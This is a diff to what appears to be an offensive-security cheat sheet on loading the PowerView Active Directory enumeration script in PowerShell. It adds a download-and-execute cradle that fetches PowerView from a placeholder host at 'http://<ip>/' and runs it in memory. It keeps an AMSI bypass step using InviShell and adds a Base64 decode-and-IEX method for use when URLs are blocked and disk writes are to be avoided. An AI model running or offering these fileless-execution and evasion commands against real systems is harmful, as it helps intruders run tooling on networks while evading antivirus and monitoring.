@@ -4,11 +4,17 @@
 
 ```powershell
 # Load into memory (avoids writing to disk)
-IEX (Get-Content C:\path\to\PowerView.ps1 -Raw)
+iex (New-Object Net.WebClient).DownloadString('http://<ip>/PowerView.ps1')
 
 # Or bypass AMSI first with InviShell
 C:\> RunWithRegistryNonAdmin.bat
 C:\> PowerView.ps1
+
+# Or use BASE64 if url is restricted and avoid writing to disk
+$Base64String = "<BASE64 ps1>"
+$StandardText = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($Base64String))
+if ($StandardText[0] -ne '#') { $StandardText = $StandardText.Substring(1) }
+IEX $StandardText
 ```
 
 ---
